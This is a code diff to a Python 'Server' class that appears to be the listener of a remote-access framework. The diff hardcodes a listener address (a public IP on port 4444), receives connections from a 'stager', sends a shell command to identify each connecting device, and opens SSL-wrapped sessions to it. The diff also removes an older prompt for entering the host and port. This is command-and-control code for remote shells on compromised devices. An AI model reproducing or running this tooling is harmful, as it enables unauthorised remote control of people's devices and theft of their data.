@@ -47,6 +47,7 @@ class Server:
 
     def set_host_port(self):
         try:
+            #lhost = "127.0.0.1"
             lhost = "13.52.100.31"
             lport = 4444
             self.host = lhost
@@ -143,7 +144,7 @@ class Server:
 
         # identify device
         hostAddress = addr[0]
-        self.verbose_print("Connecting to "+hostAddress)
+        print "Connecting to " + hostAddress
         conn.send(identification_shell_command)
         device_arch = conn.recv(128).strip()
         if not device_arch:
@@ -187,8 +188,9 @@ class Server:
                                  ssl_version=ssl.PROTOCOL_SSLv23)
         raw = ssl_sock.recv(256)
         device_info = json.loads(raw)
-        return session.Session(self,ssl_sock,device_info)
-        
+        print(device_info)
+        return session.Session(self,ssl_sock,device_info), hostAddress
+
 
     def update_session(self,old_session):
         new_session = self.listen_for_stager()
@@ -197,33 +199,3 @@ class Server:
         old_session.username = new_session.username
         old_session.type = new_session.type
 
-
-'''
-    def set_host_port(self):
-        try:
-            lhost = h.getip()
-            lport = None
-            choice = raw_input(h.info_general_raw("SET LHOST (Leave blank for "+lhost+")>"))
-            if choice != "":
-                lhost = choice
-            h.info_general("LHOST = " + lhost)
-            while True:
-                lport = raw_input(h.info_general_raw("SET LPORT (Leave blank for 4444)>"))
-                if not lport:
-                    lport = 4444
-                try:
-                    lport = int(lport)
-                except ValueError:
-                    h.info_general("invalid port, please enter a valid integer")
-                    continue
-                if lport < 1024:
-                    h.info_general("invalid port, please enter a value >= 1024")
-                    continue
-                break
-            h.info_general("LPORT = " + str(lport))
-            self.host = socket.gethostbyname(lhost)
-            self.port = lport
-            return True
-        except KeyboardInterrupt:
-            return
-'''
